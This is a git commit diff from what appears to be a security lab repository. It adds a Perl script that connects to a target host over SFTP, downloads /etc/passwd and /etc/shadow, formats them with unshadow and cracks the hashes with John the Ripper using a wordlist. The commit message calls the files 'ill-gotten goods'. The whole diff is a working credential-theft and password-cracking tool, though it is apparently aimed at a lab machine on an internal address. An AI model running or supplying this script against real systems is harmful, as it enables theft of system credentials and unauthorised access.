57e9e67a22d7b34cd6d6db6ac57b70e3fa915680
HenryFBP <HenryFBP@gmail.com>
2018-10-22 20:06:18 -0400

    add cracking of ill-gotten FTP goods to sftp.pl

--- labs/4/scripts/scripts.pm
+++ labs/4/scripts/scripts.pm
@@ -2,5 +2,5 @@ use strict;
 use warnings;
 
 our @OUTFOLDER="out/";
-our @TARGET="172.43.0.154";
+our @TARGET="172.43.0.154"; # Hello there, random GitHub user. This is an internal IP. Just letting you know.
 
---
+++ labs/4/scripts/sftp.pl
@@ -0,0 +1,35 @@
+#!/usr/bin/perl
+use strict;
+use warnings;
+use Net::SFTP::Foreign::Compat ':supplant'; # Note: If this fails, install cpanm and Net::SFTP::Foreign.
+
+require("./scripts.pm");
+our(@TARGET, @OUTFOLDER);
+
+my $in = "";
+
+
+if ((! -e "./@OUTFOLDER/passwd") or (! -e "./@OUTFOLDER/shadow") ){
+	print("Connect to them.\n");
+	my $sftp = Net::SFTP->new(@TARGET);
+
+	print("Download some cool files!\n");
+	$sftp->get("/etc/passwd", "./@OUTFOLDER/passwd") or die "get failed:" . $sftp->error;
+	$sftp->get("/etc/shadow", "./@OUTFOLDER/shadow") or die "get failed:" . $sftp->error;
+}
+else {
+	print("Files already exist.\n");
+}
+
+
+print("Format the files for john.\n");
+system("unshadow ./@OUTFOLDER/passwd ./@OUTFOLDER/shadow > ./@OUTFOLDER/passwords.txt");
+
+print("Crack passwords?\n > ");
+
+if(<STDIN> =~ /^[yY]/) {
+	print("CRACK THE PASSWORDS!\n");
+	system("john --wordlist=/usr/share/wordlists/sqlmap.txt ./@OUTFOLDER/passwords.txt");
+}
+
+
